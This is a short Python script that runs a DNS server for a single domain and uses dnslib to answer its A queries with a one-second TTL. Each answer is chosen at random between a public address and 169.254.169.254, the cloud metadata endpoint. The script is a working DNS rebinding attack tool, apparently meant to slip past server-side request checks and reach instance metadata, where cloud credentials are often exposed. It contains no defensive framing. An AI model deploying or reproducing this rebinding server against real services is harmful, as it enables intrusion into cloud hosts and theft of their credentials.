from dnslib import DNSRecord, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import random
import time

REBIND_NAME = "rb.adithya-ms.co.in"
BENIGN_IP = "146.190.62.39"
INTERNAL_IP = "169.254.169.254"
TTL_SECONDS = 1

class RebindResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        qtype = QTYPE[request.q.qtype]
        print(f"[DNS] Query: {qname} ({qtype})")
        
        reply = request.reply()
        
        if qname == REBIND_NAME and qtype in ("A", "ANY"):
            ip = random.choice([BENIGN_IP, INTERNAL_IP])
            reply.add_answer(
                RR(qname, QTYPE.A, rdata=A(ip), ttl=TTL_SECONDS)
            )
            print(f"[DNS] REBIND {qname} -> {ip}")
            return reply
        
        # For anything else under our zone, say NXDOMAIN
        if qname.endswith(REBIND_NAME):
            reply.header.rcode = 3  # NXDOMAIN
            return reply
        
        # Otherwise we are not authoritative; empty reply
        reply.header.rcode = 3
        return reply

if __name__ == "__main__":
    ADDRESS = "0.0.0.0"
    PORT = 53
    resolver = RebindResolver()
    server = DNSServer(resolver, port=PORT, address=ADDRESS, tcp=False)
    print(f"[*] Rebinding DNS server starting on {ADDRESS}:{PORT} for {REBIND_NAME}")
    server.start()